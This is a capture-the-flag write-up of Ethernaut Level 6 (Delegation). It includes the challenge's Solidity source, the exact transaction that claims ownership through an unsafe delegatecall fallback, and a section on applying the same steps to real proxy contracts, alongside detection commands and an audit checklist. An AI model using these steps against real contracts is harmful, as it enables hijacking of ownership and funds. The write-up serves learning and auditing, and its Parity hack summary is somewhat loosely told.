// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }}

    # Ethernaut — Level 6: Delegation

**Network:** Sepolia testnet  
**Contract:** `0x8A366301CA05BaEd76506fad5b241ced07e25047`  
**Date completed:** June 2026

---

## What the challenge was

Claim ownership of the `Delegation` contract.  
Two contracts were involved — `Delegate` and `Delegation` — and the `Delegation` contract used `delegatecall` in its fallback function.

---

## What confused me

- Understanding that `delegatecall` runs another contract's **code** but in the **caller's storage context** — not the target's
- Realising the fallback function was the entry point, not a direct function call

---

## Vulnerability involved

**Unsafe delegatecall in a fallback function.**

Two contracts were involved:

```solidity
contract Delegate {
    address public owner;

    function pwn() public {
        owner = msg.sender;  // writes to storage slot 0
    }
}

contract Delegation {
    address public owner;       // storage slot 0
    Delegate delegate;

    fallback() external {
        delegate.delegatecall(msg.data);  // runs Delegate's code in Delegation's context
    }
}
```

`delegatecall` is a special EVM call where:
- You execute **Contract B's code**
- But it runs in **Contract A's storage and context**

So when `Delegate.pwn()` sets `owner = msg.sender`, it writes to **Delegation's storage slot 0** — which is Delegation's `owner` variable. Not Delegate's.

Sending any transaction to `Delegation` with `pwn()` encoded as calldata triggers the fallback, which delegatecalls into `Delegate`, which sets Delegation's owner to the caller.

---

## How I solved it

**Step 1 — Encoded the `pwn()` function signature and sent it directly to the contract**

```javascript
await sendTransaction({
  from: player,
  to: '0x8A366301CA05BaEd76506fad5b241ced07e25047',
  data: web3.utils.keccak256('pwn()').slice(0, 10)
})
```

The call chain:
- Transaction hits `Delegation` with `pwn()` as data
- `Delegation` has no `pwn()` function → falls through to fallback
- Fallback does `delegate.delegatecall(msg.data)`
- `Delegate.pwn()` runs in `Delegation`'s storage context
- `owner = msg.sender` sets **Delegation's owner** to my address

**Step 2 — Verified ownership**
```javascript
await contract.owner()
// returned: 0xE7975DD97C358bD8686ee1f2a4FA054aA321d295
```

**Step 3 — Submitted the instance** ✅

---

## How to spot this in a real contract

**Search the codebase:**
```bash
grep -r "delegatecall" ./contracts/
```

**On Etherscan:**
1. Open contract → Code tab
2. `Ctrl+F` search `delegatecall`
3. Also search `fallback` and `receive`

**Red flags:**

```solidity
// ❌ delegatecall in a fallback — classic proxy danger
fallback() external {
    implementation.delegatecall(msg.data);
}

// ❌ delegatecall with user-controlled address
address impl = userInput;
impl.delegatecall(msg.data);  // attacker controls what code runs

// ❌ delegatecall with user-controlled data
target.delegatecall(msg.data);  // attacker controls what function runs
```

**Key questions when you see delegatecall:**
- Who controls the target address?
- Who controls the calldata?
- What does the called function write to storage?
- Are the storage layouts of both contracts identical?

---

## How to exploit it in a real contract

**Step 1 — Find the delegatecall**  
Look for it in fallback functions or proxy patterns.

**Step 2 — Find what functions exist on the implementation contract**  
Check if any function sets `owner`, transfers ETH, or modifies critical storage.

**Step 3 — Encode the function signature**
```javascript
web3.utils.keccak256('functionName()').slice(0, 10)
// with parameters:
web3.utils.keccak256('functionName(address,uint256)').slice(0, 10)
```

**Step 4 — Send it directly to the proxy**
```javascript
await sendTransaction({
  from: player,
  to: proxyContractAddress,
  data: web3.utils.keccak256('pwn()').slice(0, 10)
})
```

---

## Storage collision — the deeper danger

Even legitimate proxy patterns are dangerous if storage layouts don't match:

```solidity
// Implementation contract
contract Impl {
    address public owner;    // slot 0
    uint256 public balance;  // slot 1
}

// Proxy contract
contract Proxy {
    address public implementation;  // slot 0 ← COLLISION with owner
    address public admin;           // slot 1
}
```

When `Impl` writes to `owner` (slot 0), it actually overwrites `implementation` in the Proxy. An attacker can use this to replace the implementation address with a malicious contract.

---

## Tools that catch this automatically

```bash
# Slither
slither ./contracts/ --detect delegatecall-loop
slither ./contracts/ --detect controlled-delegatecall

# Mythril
myth analyze contracts/Delegation.sol
```

---

## Real audit checklist for delegatecall

| Check | Verdict |
|---|---|
| Target address is user-controlled | ❌ Critical |
| Calldata is user-controlled | ❌ Critical |
| Proxy and implementation storage layouts don't match | ❌ Critical |
| Unprotected initializer function exists | ❌ High |
| Implementation contract callable directly by anyone | ❌ High |

---

## Real world impact

The **Parity Wallet hack of 2017** — a `delegatecall` vulnerability.  
An attacker called an unprotected `initWallet()` function via delegatecall and became owner of a shared library contract, then self-destructed it. This stole $30 million in one incident and permanently froze $150 million more in a second incident — all from the same root cause.

---

## Key takeaway

`delegatecall` is like giving another contract a key to your house and saying "run your code but use my furniture." If the borrowed code touches storage, it touches **your** storage — not theirs.

Never use `delegatecall` with user-controlled addresses or calldata. Always ensure storage layouts match between proxy and implementation contracts.
